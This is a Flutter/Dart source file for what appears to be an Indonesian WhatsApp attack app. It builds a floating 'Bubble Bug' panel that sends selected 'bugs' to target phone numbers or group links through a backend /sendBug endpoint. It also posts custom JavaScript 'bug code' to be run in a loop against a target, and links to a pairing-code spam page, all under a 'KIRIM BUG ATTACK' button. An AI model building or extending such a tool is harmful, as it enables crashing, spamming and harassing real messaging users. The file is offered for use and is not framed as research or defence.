import 'dart:convert';
import 'dart:math' as math;
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:fiona/Qaxer/api.dart';
import 'bug_sender.dart';
import 'spam_pair.dart';

final _baseUrl = Api.api;

// ─── Colors (glass / transparan) ─────────────────────────────
const _bg = Color(0xE60A0A0F);
const _card = Color(0x99181824);
const _surface = Color(0xAA1C1C28);
const _red = Color(0xFFE11D48);
const _redSoft = Color(0xFFF43F5E);
const _pink = Color(0xFFFB7185);
const _text = Color(0xFFF8FAFC);
const _muted = Color(0xFF94A3B8);

/// Global controller for Bubble Bug
class BubbleBugController extends ChangeNotifier {
  BubbleBugController._();
  static final BubbleBugController I = BubbleBugController._();

  bool _visible = true;
  bool _expanded = false;
  String sessionKey = '';
  String username = '';
  String role = '';
  List<Map<String, dynamic>> listBug = [];
  List<Map<String, dynamic>> listBugGroup = [];

  bool get visible => _visible;
  bool get expanded => _expanded;

  void configure({
    required String sessionKey,
    required String username,
    required String role,
    List<Map<String, dynamic>>? listBug,
    List<Map<String, dynamic>>? listBugGroup,
  }) {
    this.sessionKey = sessionKey;
    this.username = username;
    this.role = role;
    if (listBug != null) this.listBug = listBug;
    if (listBugGroup != null) this.listBugGroup = listBugGroup;
  }

  Future<void> load() async {
    final prefs = await SharedPreferences.getInstance();
    _visible = prefs.getBool('bubble_bug_visible') ?? true;
    notifyListeners();
  }

  Future<void> setVisible(bool v) async {
    _visible = v;
    if (!v) _expanded = false;
    notifyListeners();
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('bubble_bug_visible', v);
  }

  void show() => setVisible(true);
  void hide() => setVisible(false);

  void setExpanded(bool v) {
    _expanded = v;
    notifyListeners();
  }

  void toggleExpanded() {
    _expanded = !_expanded;
    notifyListeners();
  }
}

// ═══════════════════════════════════════════════════════════════
// Floating Bubble Ball (in-app) + mini popup
// ═══════════════════════════════════════════════════════════════
class BubbleBugOverlay extends StatefulWidget {
  const BubbleBugOverlay({super.key});

  @override
  State<BubbleBugOverlay> createState() => _BubbleBugOverlayState();
}

class _BubbleBugOverlayState extends State<BubbleBugOverlay>
    with TickerProviderStateMixin, WidgetsBindingObserver {
  final _ctrl = BubbleBugController.I;

  // Default: bottom-right, positioned above the bottom navigation
  Offset _pos = const Offset(280, 520);
  bool _dragging = false;
  bool _overDismiss = false;
  Size _screen = Size.zero;
  bool _posInitialized = false;

  late AnimationController _spin;
  late AnimationController _pulse;

  static const double _size = 64;
  static const double _dismissH = 100;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _ctrl.load();
    _ctrl.addListener(_onCtrl);
    _spin = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 8),
    )..repeat();
    _pulse = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1200),
    )..repeat(reverse: true);
  }

  void _onCtrl() {
    if (mounted) setState(() {});
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _ctrl.removeListener(_onCtrl);
    _spin.dispose();
    _pulse.dispose();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    // When app goes to background, try ensure overlay permission so user
    // can still open bubble via system settings / notification path.
    if (state == AppLifecycleState.paused ||
        state == AppLifecycleState.inactive) {
      // no-op here; system overlay handled via permission + restore
    }
  }

  void _onPanStart(DragStartDetails d) {
    setState(() => _dragging = true);
    HapticFeedback.selectionClick();
  }

  Offset _clampPos(Offset p) {
    final padL = 8.0;
    final padR = 8.0;
    final padT = 40.0;
    // Keep above bottom navigation and safe area
    final padB = MediaQuery.of(context).padding.bottom + 88;
    final maxX = (_screen.width - _size - padR).clamp(padL, _screen.width);
    final maxY =
        (_screen.height - _size - 8 - padB).clamp(padT, _screen.height);
    return Offset(
      p.dx.clamp(padL, maxX),
      p.dy.clamp(padT, maxY),
    );
  }

  void _onPanUpdate(DragUpdateDetails d) {
    setState(() {
      _pos += d.delta;
      _pos = _clampPos(_pos);
      _overDismiss = _pos.dy > _screen.height - _dismissH - _size - 24;
    });
  }

  void _onPanEnd(DragEndDetails d) {
    if (_overDismiss) {
      HapticFeedback.mediumImpact();
      _ctrl.hide();
      setState(() {
        _dragging = false;
        _overDismiss = false;
        // Reset to bottom-right (same side as screenshot 2)
        _pos = Offset(
          _screen.width - _size - 16,
          _screen.height * 0.68,
        );
      });
    } else {
      setState(() {
        _dragging = false;
        _overDismiss = false;
      });
    }
  }

  void _openMini() {
    HapticFeedback.lightImpact();
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      barrierColor: Colors.black54,
      builder: (_) => MiniBugPanel(
        sessionKey: _ctrl.sessionKey,
        username: _ctrl.username,
        role: _ctrl.role,
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    _screen = MediaQuery.of(context).size;

    // First layout or out-of-bounds: place bottom-right like screenshot 2
    // (Bubble Bug stays near the lower-right edge)
    if (!_posInitialized ||
        _pos.dx > _screen.width - 10 ||
        _pos.dx < 0 ||
        _pos.dy < 0) {
      _pos = Offset(
        _screen.width - _size - 16,
        _screen.height * 0.68,
      );
      _posInitialized = true;
    }
    _pos = _clampPos(_pos);

    if (!_ctrl.visible) return const SizedBox.shrink();

    return Stack(
      children: [
        // Dismiss zone
        if (_dragging)
          Positioned(
            left: 0,
            right: 0,
            bottom: 0,
            height: _dismissH + 20,
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 150),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    Colors.transparent,
                    (_overDismiss ? _red : const Color(0xFF6366F1))
                        .withOpacity(0.6),
                  ],
                ),
              ),
              alignment: Alignment.bottomCenter,
              padding: const EdgeInsets.only(bottom: 24),
              child: Text(
                _overDismiss ? 'Lepas untuk menyembunyikan' : 'Lepas di sini',
                style: const TextStyle(
                  color: Colors.white,
                  fontWeight: FontWeight.w700,
                  fontSize: 14,
                ),
              ),
            ),
          ),

        Positioned(
          left: _pos.dx,
          top: _pos.dy,
          child: GestureDetector(
            onPanStart: _onPanStart,
            onPanUpdate: _onPanUpdate,
            onPanEnd: _onPanEnd,
            onTap: _openMini,
            child: AnimatedBuilder(
              animation: Listenable.merge([_spin, _pulse]),
              builder: (_, __) {
                final glow = 0.35 + _pulse.value * 0.25;
                return AnimatedScale(
                  scale: _overDismiss ? 0.7 : (_dragging ? 1.1 : 1.0),
                  duration: const Duration(milliseconds: 120),
                  child: SizedBox(
                    width: _size + 8,
                    height: _size + 8,
                    child: Stack(
                      alignment: Alignment.center,
                      children: [
                        // outer ring spin
                        Transform.rotate(
                          angle: _spin.value * math.pi * 2,
                          child: Container(
                            width: _size + 6,
                            height: _size + 6,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              border: Border.all(
                                color: _redSoft.withOpacity(0.45),
                                width: 2,
                              ),
                              gradient: SweepGradient(
                                colors: [
                                  _red.withOpacity(0.0),
                                  _redSoft.withOpacity(0.7),
                                  _pink.withOpacity(0.0),
                                ],
                              ),
                            ),
                          ),
                        ),
                        // glow
                        Container(
                          width: _size,
                          height: _size,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            boxShadow: [
                              BoxShadow(
                                color: _red.withOpacity(glow),
                                blurRadius: 18,
                                spreadRadius: 1,
                              ),
                            ],
                          ),
                        ),
                        // main button
                        Container(
                          width: _size - 4,
                          height: _size - 4,
                          child: ClipOval(
                            child: BackdropFilter(
                              filter: ImageFilter.blur(sigmaX: 18, sigmaY: 18),
                              child: Container(
                                decoration: BoxDecoration(
                                  shape: BoxShape.circle,
                                  gradient: LinearGradient(
                                    begin: Alignment.topLeft,
                                    end: Alignment.bottomRight,
                                    colors: [
                                      Colors.white.withOpacity(.30),
                                      const Color(0xFFFB7185).withOpacity(.48),
                                      const Color(0xFF9F1239).withOpacity(.62),
                                    ],
                                  ),
                                  border: Border.all(color: Colors.white.withOpacity(.52), width: 1.4),
                                  boxShadow: [
                                    BoxShadow(color: Colors.white.withOpacity(.10), blurRadius: 12, spreadRadius: -3),
                                    BoxShadow(color: _red.withOpacity(.28), blurRadius: 15, spreadRadius: 1),
                                  ],
                                ),
                                child: const Column(
                                  mainAxisAlignment: MainAxisAlignment.center,
                                  children: [
                                    Icon(Icons.bug_report_rounded, color: Colors.white, size: 25),
                                    Text('BUG', style: TextStyle(color: Colors.white, fontSize: 9, fontWeight: FontWeight.w900, letterSpacing: .8)),
                                  ],
                                ),
                              ),
                            ),
                          ),
                        ),
                        // badge
                        Positioned(
                          right: 2,
                          top: 2,
                          child: Container(
                            width: 16,
                            height: 16,
                            decoration: BoxDecoration(
                              color: const Color(0xFF22C55E),
                              shape: BoxShape.circle,
                              border: Border.all(color: _bg, width: 2),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                );
              },
            ),
          ),
        ),
      ],
    );
  }
}

/// Chip to restore bubble when hidden
class BubbleBugRestoreChip extends StatelessWidget {
  const BubbleBugRestoreChip({super.key});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: BubbleBugController.I,
      builder: (_, __) {
        if (BubbleBugController.I.visible) return const SizedBox.shrink();
        return Positioned(
          left: 12,
          bottom: 90,
          child: Material(
            color: Colors.transparent,
            child: InkWell(
              onTap: () {
                HapticFeedback.lightImpact();
                BubbleBugController.I.show();
              },
              borderRadius: BorderRadius.circular(20),
              child: ClipRRect(
                borderRadius: BorderRadius.circular(20),
                child: BackdropFilter(
                  filter: ImageFilter.blur(sigmaX: 16, sigmaY: 16),
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                    decoration: BoxDecoration(
                      color: const Color(0xB8182431),
                      borderRadius: BorderRadius.circular(20),
                      border: Border.all(color: Colors.white.withOpacity(.25)),
                      boxShadow: [BoxShadow(color: _red.withOpacity(.20), blurRadius: 16)],
                    ),
                    child: const Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.bug_report, color: Colors.white, size: 16),
                    SizedBox(width: 6),
                    Text(
                      'Bubble Bug',
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 12,
                        fontWeight: FontWeight.w700,
                      ),
                    ),
                    ],
                    ),
                  ),
                ),
              ),
            ),
          ),
        );
      },
    );
  }
}

// ═══════════════════════════════════════════════════════════════
// MINI BUG PANEL — pilih mode dulu, lalu tampilkan form mini
// ═══════════════════════════════════════════════════════════════
class MiniBugPanel extends StatefulWidget {
  final String sessionKey;
  final String username;
  final String role;

  const MiniBugPanel({
    super.key,
    required this.sessionKey,
    required this.username,
    required this.role,
  });

  @override
  State<MiniBugPanel> createState() => _MiniBugPanelState();
}

class _MiniBugPanelState extends State<MiniBugPanel> {
  /// null = harus pilih mode dulu
  String? _selectedMode; // number | group | testfunc | spam

  final _targetCtrl = TextEditingController();
  final _loopCtrl = TextEditingController();
  final _codeCtrl = TextEditingController();

  String _selectedBugId = '';
  String _senderType = 'private';
  bool _isSending = false;
  String? _responseMsg;
  String? _responseType; // success | error | warning
  bool _overlayOn = false;

  List<Map<String, dynamic>> get _bugs =>
      _selectedMode == 'group'
          ? BubbleBugController.I.listBugGroup
          : BubbleBugController.I.listBug;

  bool get _canGlobal {
    final r = widget.role.toLowerCase();
    return r == 'owner' ||
        r == 'admin' ||
        r == 'moderator' ||
        r == 'partner' ||
        r == 'developer' ||
        r == 'vip';
  }

  @override
  void initState() {
    super.initState();
    _checkOverlay();
  }

  @override
  void dispose() {
    _targetCtrl.dispose();
    _loopCtrl.dispose();
    _codeCtrl.dispose();
    super.dispose();
  }

  Future<void> _checkOverlay() async {
    final s = await Permission.systemAlertWindow.status;
    if (mounted) setState(() => _overlayOn = s.isGranted);
  }

  Future<void> _requestOverlay() async {
    final s = await Permission.systemAlertWindow.request();
    if (mounted) {
      setState(() => _overlayOn = s.isGranted);
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text(
            s.isGranted
                ? 'Izin overlay aktif. Bubble bisa dipakai di atas app lain.'
                : 'Izin ditolak. Buka Settings → Display over other apps.',
          ),
          backgroundColor: s.isGranted ? const Color(0xFF16A34A) : _red,
          behavior: SnackBarBehavior.floating,
        ),
      );
      if (!s.isGranted) await openAppSettings();
    }
  }

  String? _formatPhone(String s) {
    final c = s.replaceAll(RegExp(r'[^\d+]'), '');
    return (c.startsWith('+') && c.length >= 8) ? c : null;
  }

  bool _isValidGroupLink(String s) =>
      s.startsWith('https://') && s.contains('chat.whatsapp.com');

  void _pickMode(String mode) {
    if (mode == 'spam') {
      final nav = Navigator.of(context);
      nav.pop();
      nav.push(
        MaterialPageRoute(
          builder: (_) => SpamPairPage(
            sessionKey: widget.sessionKey,
            username: widget.username,
            role: widget.role,
          ),
        ),
      );
      return;
    }
    setState(() {
      _selectedMode = mode;
      _selectedBugId = '';
      _targetCtrl.clear();
      _loopCtrl.clear();
      _codeCtrl.clear();
      _responseMsg = null;
      final bugs = mode == 'group'
          ? BubbleBugController.I.listBugGroup
          : BubbleBugController.I.listBug;
      if (bugs.isNotEmpty) {
        _selectedBugId = (bugs.first['bug_id'] ?? '').toString();
      }
    });
  }

  Future<void> _sendAttack() async {
    if (_isSending) return;
    final raw = _targetCtrl.text.trim();
    final key = widget.sessionKey;

    setState(() {
      _isSending = true;
      _responseMsg = null;
    });

    try {
      if (_selectedMode == 'testfunc') {
        final loop = _loopCtrl.text.trim();
        final code = _codeCtrl.text.trim();
        if (loop.isEmpty || int.tryParse(loop) == null || int.parse(loop) <= 0) {
          _setResp('error', 'Loop tidak valid. Masukkan angka > 0.');
          return;
        }
        if (code.isEmpty || !code.contains('async function')) {
          _setResp('error', 'Kode JS tidak valid (harus ada async function).');
          return;
        }
        if (raw.isEmpty) {
          _setResp('error', 'Target nomor wajib diisi.');
          return;
        }
        final res = await http
            .post(
              Uri.parse('$_baseUrl/api/testFunction'),
              headers: {'Content-Type': 'application/json'},
              body: json.encode({
                'key': key,
                'target': raw,
                'loop': loop,
                'code': code,
              }),
            )
            .timeout(const Duration(seconds: 15));
        final data = jsonDecode(res.body);
        if (data['valid'] == true && data['success'] == true) {
          _setResp('success', data['message'] ?? 'Eksekusi function dimulai!');
        } else {
          _setResp('error', data['error']?.toString() ?? 'Gagal mengeksekusi.');
        }
      } else {
        if (_selectedMode == 'number') {
          if (_formatPhone(raw) == null) {
            _setResp('error', 'Nomor tidak valid. Contoh: +62812xxxxxxxx');
            return;
          }
        } else {
          if (!_isValidGroupLink(raw)) {
            _setResp('error', 'Link grup tidak valid.');
            return;
          }
        }
        if (_senderType == 'global' && !_canGlobal) {
          _setResp('error', 'Sender Global hanya untuk role tertentu.');
          return;
        }
        if (_selectedBugId.isEmpty) {
          _setResp('error', 'Pilih bug terlebih dahulu.');
          return;
        }
        final encoded = Uri.encodeComponent(raw);
        final url = Uri.parse(
          '$_baseUrl/sendBug'
          '?key=$key'
          '&target=$encoded'
          '&bug=$_selectedBugId'
          '${_senderType == 'global' ? '&senderMode=global' : ''}',
        );
        final res = await http.get(url).timeout(const Duration(seconds: 15));
        final data = jsonDecode(res.body);
        if (data['valid'] == false) {
          _setResp('error', 'Session tidak valid. Login ulang.');
        } else if (data['cooldown'] == true) {
          _setResp('warning', 'Cooldown! Tunggu ${data['wait'] ?? 0} detik.');
        } else if (data['sended'] == true) {
          _setResp('success', 'Bug berhasil dikirim! [${data['role'] ?? widget.role}]');
          _targetCtrl.clear();
        } else {
          _setResp('error', data['error']?.toString() ?? data['message']?.toString() ?? 'Gagal mengirim.');
        }
      }
    } catch (e) {
      _setResp('error', 'Koneksi gagal: $e');
    } finally {
      if (mounted) setState(() => _isSending = false);
    }
  }

  void _setResp(String type, String msg) {
    if (!mounted) return;
    setState(() {
      _responseType = type;
      _responseMsg = msg;
      _isSending = false;
    });
  }

  @override
  Widget build(BuildContext context) {
    final bottom = MediaQuery.of(context).viewInsets.bottom;
    return ClipRRect(
      borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 18, sigmaY: 18),
        child: Container(
          constraints: BoxConstraints(
            maxHeight: MediaQuery.of(context).size.height * 0.88,
          ),
          margin: EdgeInsets.only(bottom: bottom),
          decoration: BoxDecoration(
            color: _bg.withOpacity(0.72),
            borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
            border: Border.all(color: _red.withOpacity(0.28)),
            boxShadow: [
              BoxShadow(
                color: _red.withOpacity(0.15),
                blurRadius: 24,
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
          // handle
          const SizedBox(height: 10),
          Container(
            width: 40,
            height: 4,
            decoration: BoxDecoration(
              color: _muted.withOpacity(0.4),
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          // header
          Padding(
            padding: const EdgeInsets.fromLTRB(16, 12, 8, 8),
            child: Row(
              children: [
                Container(
                  width: 40,
                  height: 40,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    gradient: const LinearGradient(
                      colors: [Color(0xFFFB7185), Color(0xFFE11D48)],
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: _red.withOpacity(0.4),
                        blurRadius: 10,
                      ),
                    ],
                  ),
                  child: const Icon(Icons.bug_report_rounded,
                      color: Colors.white, size: 22),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text(
                        'Bubble Bug',
                        style: TextStyle(
                          color: _text,
                          fontSize: 18,
                          fontWeight: FontWeight.w800,
                        ),
                      ),
                      Text(
                        _selectedMode == null
                            ? 'Pilih mode bug dulu'
                            : _modeTitle(_selectedMode!),
                        style: const TextStyle(color: _muted, fontSize: 12),
                      ),
                    ],
                  ),
                ),
                if (_selectedMode != null)
                  IconButton(
                    tooltip: 'Ganti mode',
                    onPressed: () => setState(() {
                      _selectedMode = null;
                      _responseMsg = null;
                    }),
                    icon: const Icon(Icons.swap_horiz_rounded, color: _muted),
                  ),
                IconButton(
                  onPressed: () => Navigator.pop(context),
                  icon: const Icon(Icons.close_rounded, color: _muted),
                ),
              ],
            ),
          ),

          // overlay toggle (compact)
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 16),
            child: Material(
              color: _card,
              borderRadius: BorderRadius.circular(12),
              child: InkWell(
                onTap: _requestOverlay,
                borderRadius: BorderRadius.circular(12),
                child: Padding(
                  padding:
                      const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                  child: Row(
                    children: [
                      Icon(
                        _overlayOn
                            ? Icons.layers_rounded
                            : Icons.layers_clear_rounded,
                        color: _overlayOn ? const Color(0xFF22C55E) : _pink,
                        size: 20,
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: Text(
                          _overlayOn
                              ? 'Overlay aktif'
                              : 'Aktifkan Overlay',
                          style: TextStyle(
                            color: _overlayOn
                                ? const Color(0xFF22C55E)
                                : _text,
                            fontSize: 13,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                      ),
                      Switch(
                        value: _overlayOn,
                        activeColor: const Color(0xFF22C55E),
                        onChanged: (_) => _requestOverlay(),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),
          const SizedBox(height: 12),

          Flexible(
            child: SingleChildScrollView(
              padding: const EdgeInsets.fromLTRB(16, 0, 16, 24),
              child: _selectedMode == null
                  ? _buildModePicker()
                  : _buildModeForm(),
            ),
          ),
            ],
          ),
        ),
      ),
    );
  }

  String _modeTitle(String m) {
    switch (m) {
      case 'number':
        return 'BUG NUMBER · mini';
      case 'group':
        return 'BUG GROUP · mini';
      case 'testfunc':
        return 'TEST FUNCTION · mini';
      default:
        return 'Mode';
    }
  }

  Widget _buildModePicker() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        const Text(
          'Pilih Mode Bug',
          textAlign: TextAlign.center,
          style: TextStyle(
            color: _text,
            fontSize: 16,
            fontWeight: FontWeight.w800,
          ),
        ),
        const SizedBox(height: 6),
        const Text(
          'Tap salah satu untuk membuka form mini',
          textAlign: TextAlign.center,
          style: TextStyle(color: _muted, fontSize: 12),
        ),
        const SizedBox(height: 16),
        _modeCard(
          color: _red,
          icon: Icons.phone_android_rounded,
          title: 'BUG NUMBER',
          desc: 'Kirim bug ke nomor WhatsApp',
          onTap: () => _pickMode('number'),
        ),
        const SizedBox(height: 10),
        _modeCard(
          color: const Color(0xFFA855F7),
          icon: Icons.groups_rounded,
          title: 'BUG GROUP',
          desc: 'Kirim bug ke grup WhatsApp',
          onTap: () => _pickMode('group'),
        ),
        const SizedBox(height: 10),
        _modeCard(
          color: _redSoft,
          icon: Icons.code_rounded,
          title: 'TEST FUNCTION',
          desc: 'Eksekusi function JS custom',
          onTap: () => _pickMode('testfunc'),
        ),
        const SizedBox(height: 10),
        _modeCard(
          color: const Color(0xFF0EA5E9),
          icon: Icons.link_rounded,
          title: 'PAIRING CODE',
          desc: 'Buat kode pairing untuk menghubungkan perangkat',
          onTap: () => _pickMode('spam'),
        ),
      ],
    );
  }

  Widget _modeCard({
    required Color color,
    required IconData icon,
    required String title,
    required String desc,
    required VoidCallback onTap,
  }) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(16),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
        child: Material(
          color: color.withOpacity(0.08),
          borderRadius: BorderRadius.circular(16),
          child: InkWell(
            onTap: onTap,
            borderRadius: BorderRadius.circular(16),
            child: Container(
              padding: const EdgeInsets.all(14),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: color.withOpacity(0.4)),
                color: Colors.white.withOpacity(0.04),
              ),
              child: Row(
                children: [
                  Container(
                    width: 48,
                    height: 48,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: color.withOpacity(0.12),
                      border: Border.all(color: color.withOpacity(0.5)),
                    ),
                    child: Icon(icon, color: color, size: 24),
                  ),
                  const SizedBox(width: 14),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          title,
                          style: TextStyle(
                            color: color,
                            fontSize: 14,
                            fontWeight: FontWeight.w800,
                            letterSpacing: 0.3,
                          ),
                        ),
                        const SizedBox(height: 2),
                        Text(
                          desc,
                          style: const TextStyle(color: _muted, fontSize: 12),
                        ),
                      ],
                    ),
                  ),
                  Icon(Icons.chevron_right_rounded,
                      color: color.withOpacity(0.7)),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildModeForm() {
    final isTest = _selectedMode == 'testfunc';
    final isGroup = _selectedMode == 'group';
    final bugs = _bugs;

    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        // Target
        _fieldLabel(isTest
            ? 'Target Nomor'
            : (isGroup ? 'Link Grup WhatsApp' : 'Nomor Target')),
        const SizedBox(height: 6),
        TextField(
          controller: _targetCtrl,
          style: const TextStyle(color: _text, fontSize: 14),
          keyboardType:
              isGroup ? TextInputType.url : TextInputType.phone,
          decoration: _inputDeco(
            hint: isTest
                ? 'Contoh: 62812xxx'
                : (isGroup
                    ? 'https://chat.whatsapp.com/...'
                    : 'Contoh: +62812xxxxxxxx'),
            icon: isGroup ? Icons.link_rounded : Icons.phone_android_rounded,
          ),
        ),
        const SizedBox(height: 14),

        if (isTest) ...[
          _fieldLabel('Jumlah Loop'),
          const SizedBox(height: 6),
          TextField(
            controller: _loopCtrl,
            style: const TextStyle(color: _text, fontSize: 14),
            keyboardType: TextInputType.number,
            decoration: _inputDeco(hint: 'Contoh: 10', icon: Icons.repeat),
          ),
          const SizedBox(height: 14),
          _fieldLabel('Function Code (JS)'),
          const SizedBox(height: 6),
          TextField(
            controller: _codeCtrl,
            style: const TextStyle(
              color: _text,
              fontSize: 12,
              fontFamily: 'monospace',
            ),
            maxLines: 5,
            decoration: _inputDeco(
              hint:
                  'async function myFunc(sock, target) {\n  // paste bug code\n}',
              icon: Icons.code_rounded,
            ),
          ),
        ] else ...[
          // Select Bug
          _fieldLabel('Select Bug'),
          const SizedBox(height: 8),
          if (bugs.isEmpty)
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: _card,
                borderRadius: BorderRadius.circular(12),
              ),
              child: const Text(
                'Tidak ada bug tersedia.',
                style: TextStyle(color: _muted, fontSize: 13),
                textAlign: TextAlign.center,
              ),
            )
          else
            SizedBox(
              height: 88,
              child: ListView.separated(
                scrollDirection: Axis.horizontal,
                itemCount: bugs.length,
                separatorBuilder: (_, __) => const SizedBox(width: 8),
                itemBuilder: (_, i) {
                  final b = bugs[i];
                  final id = (b['bug_id'] ?? b['id'] ?? '').toString();
                  final name =
                      (b['bug_name'] ?? b['name'] ?? id).toString();
                  final selected = id == _selectedBugId;
                  return GestureDetector(
                    onTap: () => setState(() => _selectedBugId = id),
                    child: AnimatedContainer(
                      duration: const Duration(milliseconds: 150),
                      width: 100,
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: selected
                            ? _red.withOpacity(0.15)
                            : _card,
                        borderRadius: BorderRadius.circular(14),
                        border: Border.all(
                          color: selected ? _red : Colors.transparent,
                          width: 1.5,
                        ),
                      ),
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(
                            Icons.shield_rounded,
                            color: selected ? _red : _muted,
                            size: 22,
                          ),
                          const SizedBox(height: 4),
                          Text(
                            name,
                            maxLines: 2,
                            overflow: TextOverflow.ellipsis,
                            textAlign: TextAlign.center,
                            style: TextStyle(
                              color: selected ? _red : _text,
                              fontSize: 11,
                              fontWeight: FontWeight.w700,
                            ),
                          ),
                        ],
                      ),
                    ),
                  );
                },
              ),
            ),
          const SizedBox(height: 14),

          // Sender Type
          _fieldLabel('Sender Type'),
          const SizedBox(height: 8),
          Row(
            children: [
              Expanded(
                child: _senderChip(
                  'Private',
                  Icons.person_rounded,
                  _senderType == 'private',
                  () => setState(() => _senderType = 'private'),
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: _senderChip(
                  'Global',
                  Icons.public_rounded,
                  _senderType == 'global',
                  () {
                    if (!_canGlobal) {
                      _setResp('error', 'Akses Global ditolak untuk role ini.');
                      return;
                    }
                    setState(() => _senderType = 'global');
                  },
                ),
              ),
            ],
          ),
        ],

        // Response
        if (_responseMsg != null) ...[
          const SizedBox(height: 14),
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: _respColor(_responseType!).withOpacity(0.12),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(
                color: _respColor(_responseType!).withOpacity(0.4),
              ),
            ),
            child: Text(
              _responseMsg!,
              style: TextStyle(
                color: _respColor(_responseType!),
                fontSize: 13,
                fontWeight: FontWeight.w600,
              ),
            ),
          ),
        ],

        const SizedBox(height: 18),
        // Kirim button
        SizedBox(
          height: 50,
          child: ElevatedButton(
            onPressed: _isSending ? null : _sendAttack,
            style: ElevatedButton.styleFrom(
              backgroundColor: _red,
              foregroundColor: Colors.white,
              disabledBackgroundColor: _red.withOpacity(0.4),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(14),
              ),
              elevation: 0,
            ),
            child: _isSending
                ? const SizedBox(
                    width: 22,
                    height: 22,
                    child: CircularProgressIndicator(
                      strokeWidth: 2.5,
                      color: Colors.white,
                    ),
                  )
                : const Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(Icons.rocket_launch_rounded, size: 20),
                      SizedBox(width: 8),
                      Text(
                        'KIRIM BUG ATTACK',
                        style: TextStyle(
                          fontWeight: FontWeight.w800,
                          fontSize: 14,
                          letterSpacing: 0.5,
                        ),
                      ),
                    ],
                  ),
          ),
        ),
      ],
    );
  }

  Color _respColor(String t) {
    switch (t) {
      case 'success':
        return const Color(0xFF22C55E);
      case 'warning':
        return const Color(0xFFF59E0B);
      default:
        return _red;
    }
  }

  Widget _fieldLabel(String t) => Text(
        t,
        style: const TextStyle(
          color: _muted,
          fontSize: 12,
          fontWeight: FontWeight.w600,
        ),
      );

  InputDecoration _inputDeco({required String hint, required IconData icon}) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(color: _muted.withOpacity(0.6), fontSize: 13),
      prefixIcon: Icon(icon, color: _muted, size: 20),
      filled: true,
      fillColor: _card,
      contentPadding:
          const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      border: OutlineInputBorder(
        borderRadius: BorderRadius.circular(12),
        borderSide: BorderSide.none,
      ),
      focusedBorder: OutlineInputBorder(
        borderRadius: BorderRadius.circular(12),
        borderSide: const BorderSide(color: _red, width: 1.2),
      ),
    );
  }

  Widget _senderChip(
      String label, IconData icon, bool selected, VoidCallback onTap) {
    return Material(
      color: selected ? _red.withOpacity(0.15) : _card,
      borderRadius: BorderRadius.circular(12),
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(12),
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 12),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(12),
            border: Border.all(
              color: selected ? _red : Colors.transparent,
              width: 1.5,
            ),
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(icon, color: selected ? _red : _muted, size: 18),
              const SizedBox(width: 6),
              Text(
                label,
                style: TextStyle(
                  color: selected ? _red : _text,
                  fontWeight: FontWeight.w700,
                  fontSize: 13,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
